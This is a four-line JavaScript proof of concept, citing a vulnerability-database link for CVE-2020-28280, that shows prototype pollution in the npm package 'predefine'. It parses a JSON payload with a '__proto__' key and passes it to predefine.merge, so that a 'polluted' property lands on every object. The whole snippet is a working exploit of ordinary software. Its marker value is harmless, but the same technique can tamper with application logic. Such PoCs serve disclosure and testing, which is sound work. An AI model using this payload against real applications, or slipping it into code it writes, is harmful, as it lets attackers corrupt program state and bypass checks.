//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28280
  var predefine = require("predefine");
  const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  predefine.merge({}, payload);
